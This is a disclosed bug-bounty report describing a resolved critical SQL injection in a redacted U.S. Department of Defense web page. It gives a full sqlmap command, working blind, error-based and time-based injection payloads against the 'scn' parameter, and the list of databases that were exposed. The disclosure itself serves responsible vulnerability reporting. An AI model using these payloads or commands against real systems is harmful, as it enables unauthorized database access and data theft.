---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-09-14
submitted: 2022-07-05T14:01:06.968Z
bounty_usd: null
votes: 17
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "malcolmx"
source: "https://hackerone.com/reports/1626198"
title: "SQL injection at [█████████] [HtUS]"
---
# SQL injection at [█████████] [HtUS]

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 17 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-09-14

- Report: [https://hackerone.com/reports/1626198](https://hackerone.com/reports/1626198)
- CWE: SQL Injection
- Submitted: 2022-07-05T14:01:06.968Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,

##Summary

while doing test on [`█████`](http://███████/) I’ve found that the endpoint at `/olc/set/m101/leasib.php` is vulnerable with SQL injection vulnerability

##Vulnerable parameters 

- scn
- SUBJECT
- COURSEID

##POC

1. using sqlmap run command `python3 [sqlmap.py](http://sqlmap.py/) --level=5 --risk=3 --tamper=space2comment --random-agent -u [https://████/olc/set/m101/leasib.php](https://█████/olc/set/m101/leasib.php) --data="COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0" -p scn`
2. we can se that the target is vulnerable 

```jsx
Parameter: scn (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47636148 FROM DUAL WHERE 1321=1321 AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x7171706271,(SELECT (ELT(7303=7303,1))),0x71716b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47774954 FROM DUAL WHERE 5475=5475 AND (SELECT 6347 FROM (SELECT(SLEEP(5)))eoxH))||'
---
```

1. add - -dbs we can see the databases   

```jsx
available databases [13]:
[*] ███
[*] ███mobile
[*] GET
[*] information_schema
[*] LEAM
[*] leat
[*] LEV
[*] mysql
[*] performance_schema
[*] SET
[*] test
[*] testadmin
[*] testusers
```

## Impact

allows remote attacker to gain access to the database

## Timeline

- **Report Filed**
- **2022-07-05** @h1_mediation_neal: Hi @malcolmx,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@fuzzface
- **2022-07-05** @malcolmx: ##POC screens 

███

██████

Regards,
Thanks
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **Changed Scope**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
